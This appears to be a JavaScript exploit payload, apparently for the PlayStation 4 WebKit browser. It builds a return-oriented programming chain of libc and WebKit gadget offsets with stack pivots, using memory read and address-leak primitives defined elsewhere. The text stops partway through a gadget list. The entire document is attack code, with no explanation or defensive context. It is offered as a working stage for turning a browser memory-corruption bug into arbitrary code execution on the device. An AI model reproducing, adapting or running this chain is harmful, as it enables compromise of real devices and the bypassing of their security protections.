try{var ropchain_array = new Uint32Array(53398);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0; // STUB
ropchain_offset = 2;
set_gadgets([
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+65656, //rdi_bak-0x48
libc_base+423782, //mov [rsi + 0x48], rax
libc_base+155394, //pop rdi
ropchain+65688, //stack_bottom
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+120, //ret_addr
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+185824, //_main
//ret_addr:
libc_base+766440, //pop rsp
ropchain+65688 //stack_bottom
]);
//_ps4_printf_buffer:
var printf_buf_offset = 136;
ropchain_offset = 34;
set_gadget(printf_buf);
//_ps4_printf_fd:
db([4294967295, 4294967295]); // -0x1
//stack:
ropchain_offset += 16384;
//stack_bottom:
set_gadgets([
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
main_ret-0x10,
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//rdi_bak:
//_pivot_back_addr:
db([0, 0]); // 0x0
set_gadgets([
pivot_addr,
//___builtin_bswap16:
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+65792, //L0-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L0:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+65888, //L2-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+65920, //L5-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
webkit_base+1412577 //pop r8
]);
//L2:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L5:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+66024, //L8-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+66008, //L7-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L7:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L8:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224576, //mov ax, [rdi]
libc_base+362222, //pop rsi
ropchain+66184, //L12-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+66136, //L9-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+66168, //L11-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L9:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L10:
db([16, 0]); // 0x10
set_gadget(libc_base+155394,); //pop rdi
//L11:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L12:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+66240, //L14-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L14:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+66344, //L15-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+66376, //L17-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+66360, //L16-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L15:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L16:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L17:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+66536, //L21-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+66488, //L18-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+66520, //L20-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L18:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L19:
db([48, 0]); // 0x30
set_gadget(libc_base+155394,); //pop rdi
//L20:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L21:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+66640, //L23-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+66624, //L22-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L22:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L23:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L24:
db([8, 0]); // 0x8
set_gadget(libc_base+467092,); //pop rax
//L25:
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+66848, //L28-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+66816, //L26-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L26:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L27:
db([48, 0]); // 0x30
set_gadget(libc_base+467092,); //pop rax
//L28:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+66952, //L30-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+66936, //L29-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L29:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L30:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+67048, //L33-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L31:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L33:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+67152, //L36-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+67136, //L35-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L35:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L36:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224576, //mov ax, [rdi]
libc_base+362222, //pop rsi
ropchain+67312, //L40-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+67264, //L37-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+67296, //L39-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L37:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L38:
db([16, 0]); // 0x10
set_gadget(libc_base+155394,); //pop rdi
//L39:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L40:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+67368, //L42-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L42:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+67472, //L43-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+67504, //L45-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+67488, //L44-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L43:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L44:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L45:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+67664, //L49-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+67616, //L46-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+67648, //L48-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L46:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L47:
db([48, 0]); // 0x30
set_gadget(libc_base+155394,); //pop rdi
//L48:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L49:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+67768, //L51-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+67752, //L50-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L50:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L51:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L52:
db([8, 0]); // 0x8
set_gadget(libc_base+467092,); //pop rax
//L53:
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+67968, //L56-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+67936, //L54-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L54:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L55:
db([32, 0]); // 0x20
set_gadget(libc_base+467092,); //pop rax
//L56:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+68072, //L58-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+68056, //L57-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L57:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L58:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+68184, //L61-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+68152, //L59-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L59:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L60:
db([48, 0]); // 0x30
set_gadget(libc_base+467092,); //pop rax
//L61:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+68248, //L62-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+757614 //pop rcx
]);
//L62:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+68304, //L65-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L65:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222, //pop rsi
ropchain+68448, //L67-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+68464, //L68-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+68432, //L66-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L66:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L67:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L68:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+68568, //L69-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+68600, //L71-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+68584, //L70-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L69:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L70:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L71:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+68696, //L72-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+68712, //L73-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L72:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L73:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+68824, //L74-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+68808, //L75-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L75:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L74:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+68912, //L77-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+68896, //L76-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L76:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L77:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+69008, //L78-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+69024, //L79-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L78:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L79:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+69136, //L80-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+69120, //L81-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L81:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L80:
db([0, 0]); // 0x0
//___builtin_bswap32:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+69208, //L82-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L82:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+69304, //L84-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+69336, //L87-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
webkit_base+1412577 //pop r8
]);
//L84:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L85:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L87:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+69440, //L90-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+69424, //L89-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L89:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L90:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+69608, //L93-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+69624, //L94-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+69576, //L91-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+69592, //L92-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L91:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L92:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L93:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L94:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+69720, //L96-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+69704, //L95-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L95:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L96:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L97:
db([24, 0]); // 0x18
set_gadget(libc_base+467092,); //pop rax
//L98:
db([24, 0]); // 0x18
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+69920, //L101-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+69888, //L99-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L99:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L100:
db([32, 0]); // 0x20
set_gadget(libc_base+467092,); //pop rax
//L101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+70024, //L103-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+70008, //L102-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L102:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L103:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845793, //shr rax, cl
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+70128, //L106-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L104:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L106:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+70232, //L109-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+70216, //L108-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L108:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L109:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+70400, //L112-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+70416, //L113-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+70368, //L110-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+70384, //L111-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L110:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L111:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L112:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L113:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+70512, //L115-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+70496, //L114-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L114:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L115:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L116:
db([16711680, 0]); // 0xff0000
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+70624, //L119-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L119:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+26378423, //and rax, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L120:
db([8, 0]); // 0x8
set_gadget(libc_base+467092,); //pop rax
//L121:
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+70856, //L124-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+70824, //L122-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L122:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L123:
db([32, 0]); // 0x20
set_gadget(libc_base+467092,); //pop rax
//L124:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+70960, //L126-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+70944, //L125-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L125:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+71016, //L127-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L127:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+71072, //L130-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L130:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+71200, //L133-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L131:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L133:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+71304, //L136-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+71288, //L135-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L135:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L136:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+71472, //L139-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+71488, //L140-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+71440, //L137-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+71456, //L138-0x10
